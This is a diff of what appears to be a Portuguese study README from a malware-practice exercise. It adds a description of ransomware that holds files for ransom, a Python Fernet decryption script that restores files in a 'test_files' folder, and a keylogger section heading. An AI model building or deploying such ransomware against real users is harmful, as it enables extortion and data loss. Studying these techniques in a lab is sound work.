@@ -8,7 +8,11 @@ Realizei toda a prática ensinada / orientada para que eu pudesse sentir diretam
 Utilizei os mesmos scripts no VSCode para as duas técnicas.
 
 
-## Malware - Ransomware: ##
+## Malware - Ransomware: Criptograr ##
+
+> Script para que os dados de alguns arquivos sejam criptografados através de uma chave e somente após o pagamento de resgate, a chave é informada para descriptografar esses dados.
+>
+> 
 
 from cryptography.fernet import Fernet
 import os
@@ -72,6 +76,43 @@ if __name__ == "__main__":
     main()
 
     -----------------------------------------
+    
+## Malware - Ransomware: Descriptograr ##
+
+from cryptography.fernet import Fernet
+import os  
+
+def carregar_chave():
+    return open("chave.key", "rb").read()
+
+def descriptografar_arquivo(arquivo,chave):
+    f = Fernet(chave)
+    with open(arquivo, "rb") as file:
+        dados = file.read()
+        dados_descriptografados = f.decrypt(dados)
+    with open(arquivo, "wb") as file:
+        file.write(dados_descriptografados)
+
+def encontrar_arquivos(diretorio):
+    lista = []
+    for raiz, _, arquivos in os.walk(diretorio):
+        for nome in arquivos:
+            caminho = os.path.join(raiz, nome)
+            if nome != "ransomware.py" and not nome.endswith(".key"):
+                lista.append(caminho)
+    return lista
+
+def main():
+    chave = carregar_chave()
+    arquivos = encontrar_arquivos("test_files")
+    for arquivo in arquivos:
+        descriptografar_arquivo(arquivo, chave)
+    print("Arquivos restaurados com sucesso")
+
+if __name__ == "__main__":
+    main()
+
+    --------------------------------------
 
 ## Malware - Keylogger: ##
 
